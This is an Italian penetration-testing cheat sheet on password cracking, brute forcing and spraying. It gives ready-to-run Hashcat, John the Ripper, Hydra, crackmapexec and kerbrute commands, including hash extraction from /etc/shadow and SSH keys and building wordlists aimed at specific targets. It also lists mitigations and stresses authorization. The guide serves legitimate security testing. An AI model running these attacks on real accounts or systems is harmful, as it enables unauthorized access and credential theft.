# Password Tools

## Scopo

Questa guida copre strumenti e tecniche per il password cracking, password spraying e gestione di wordlist utilizzati durante penetration test.

## Prerequisiti

- Hashcat, John the Ripper
- Hardware adeguato (GPU consigliata)
- Wordlist (SecLists, RockYou)
- **Autorizzazione per testing**

## Installazione

```bash
sudo apt-get update
sudo apt-get install hashcat john hydra medusa ncrack
pip install patator
```

---

## Online Attacks Tools

| Tool | Uso |
|------|-----|
| Hydra | Multi-protocol bruteforce |
| Medusa | Parallel login brute forcer |
| Ncrack | Network auth cracker |
| Patator | Modular brute forcer |
| CeWL | Custom wordlist generator |
| Cain and Abel | Windows password recovery |

---

## Hash Identification

### hash-identifier

```bash
hash-identifier
# Incolla hash

# Alternativa online
# https://hashes.com/en/tools/hash_identifier
```

### hashid

```bash
hashid '$2y$10$xyz...'
# Output: Blowfish(OpenBSD)

hashid '5f4dcc3b5aa765d61d8327deb882cf99'
# Output: MD5
```

---

## Hashcat

### Comandi Base

```bash
# Lista hash types
hashcat --help | grep -i mysql

# Crack MD5
hashcat -m 0 hashes.txt wordlist.txt

# Crack NTLM
hashcat -m 1000 hashes.txt wordlist.txt

# Crack bcrypt
hashcat -m 3200 hashes.txt wordlist.txt
```

### Hash Types Comuni

| Mode | Tipo |
|------|------|
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1000 | NTLM |
| 3200 | bcrypt |
| 5600 | NetNTLMv2 |
| 13100 | Kerberos TGS |
| 18200 | Kerberos AS-REP |
| 22000 | WPA-PBKDF2-PMKID |

### Attack Modes

```bash
# -a 0: Dictionary
hashcat -m 0 -a 0 hash.txt wordlist.txt

# -a 1: Combination
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt

# -a 3: Brute Force (Mask)
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a

# -a 6: Wordlist + Mask
hashcat -m 0 -a 6 hash.txt wordlist.txt ?d?d?d?d

# -a 7: Mask + Wordlist
hashcat -m 0 -a 7 hash.txt ?d?d wordlist.txt
```

### Mask Charset

| Charset | Caratteri |
|---------|-----------|
| ?l | abcdefghijklmnopqrstuvwxyz |
| ?u | ABCDEFGHIJKLMNOPQRSTUVWXYZ |
| ?d | 0123456789 |
| ?s | Simboli speciali |
| ?a | Tutti (lduds) |

### Rules

```bash
# Applica rules
hashcat -m 0 -a 0 hash.txt wordlist.txt -r rules/best64.rule

# Rules comuni
/usr/share/hashcat/rules/best64.rule
/usr/share/hashcat/rules/rockyou-30000.rule
/usr/share/hashcat/rules/d3ad0ne.rule
```

---

## John the Ripper

### Comandi Base

```bash
# Crack con wordlist
john --wordlist=wordlist.txt hashes.txt

# Formato specifico
john --format=raw-md5 hashes.txt

# Show cracked
john --show hashes.txt

# Incremental (brute force)
john --incremental hashes.txt
```

### Formati Comuni

```bash
# Lista formati
john --list=formats | grep -i md5

# Esempi
john --format=raw-md5 hashes.txt
john --format=bcrypt hashes.txt
john --format=nt hashes.txt
john --format=sha512crypt hashes.txt
```

### Estrazione Hash

```bash
# /etc/shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt

# Zip
zip2john file.zip > zip.hash
john zip.hash

# PDF
pdf2john.pl file.pdf > pdf.hash
john pdf.hash

# SSH key
ssh2john id_rsa > ssh.hash
john ssh.hash
```

---

## Hydra (Online Attack)

### SSH

```bash
hydra -l user -P wordlist.txt ssh://target
hydra -L users.txt -P passwords.txt ssh://target -t 4
```

### HTTP POST

```bash
hydra -l admin -P wordlist.txt target http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

### FTP

```bash
hydra -l admin -P wordlist.txt ftp://target
```

### SMB

```bash
hydra -l administrator -P wordlist.txt smb://target
```

### Opzioni Utili

```bash
-t 4    # Thread paralleli
-V      # Verbose
-f      # Stop al primo successo
-s PORT # Porta custom
```

---

## Password Spraying

### Concetto

```
Poche password comuni testate su molti utenti
Evita lockout (1 tentativo per utente)

password123 → user1, user2, user3...
(attendi)
Summer2024! → user1, user2, user3...
```

### Spray

```bash
# Con hydra
hydra -L users.txt -p 'Password123!' target smb

# Con crackmapexec
crackmapexec smb target -u users.txt -p 'Password123!'

# Con kerbrute
kerbrute passwordspray --dc DC_IP -d domain.local users.txt password.txt
```

### Spray Tools

```bash
# SprayingToolkit
python3 atomizer.py owa target users.txt 'Spring2024!'

# Ruler
./ruler --domain target.com brute --userpass userpass.txt
```

---

## Wordlist

### Creazione Custom

```bash
# cewl - Scrape parole da sito
cewl http://target.com -w custom_wordlist.txt

# Con profondità
cewl -d 5 -m 5 http://target.com -w wordlist.txt
```

### Mutazione

```bash
# Hashcat rules
hashcat wordlist.txt -r rules/best64.rule --stdout > mutated.txt

# John rules
john --wordlist=wordlist.txt --rules --stdout > mutated.txt
```

### CUPP

```bash
# Custom User Password Profiler
python3 cupp.py -i
# Inserisci info target (nome, date, etc.)
```

### Mentalist

```bash
# GUI per wordlist generation
# Nodes: base words, case, prepend, append, etc.
```

---

## Wordlist Famose

| Nome | Contenuto |
|------|-----------|
| rockyou.txt | 14M password leak |
| SecLists | Collezione categorizzata |
| CrackStation | 1.5B words |
| Kaonashi | Password italiane/EU |

```bash
# SecLists
git clone https://github.com/danielmiessler/SecLists.git

# Location
/usr/share/wordlists/rockyou.txt
```

---

## Mitigazioni

### Password Policy

```
- Minimo 12 caratteri
- Complessità (maiuscole, numeri, simboli)
- No password comuni
- No info personali
```

### Account Lockout

```
- Lockout dopo N tentativi
- Progressivo delay
- CAPTCHA dopo fallimenti
```

### MFA

```
- TOTP (Google Authenticator)
- Hardware token
- Push notification
```

---

## Best Practices

- **Offline first**: Preferisci crack offline
- **GPU**: Usa GPU per velocità
- **Rules**: Combina wordlist + rules
- **Custom**: Crea wordlist specifiche per target
- **Legal**: Solo su sistemi autorizzati

## Riferimenti

- [Hashcat Wiki](https://hashcat.net/wiki/)
- [John the Ripper](https://www.openwall.com/john/)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [HackTricks Password Cracking](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force)
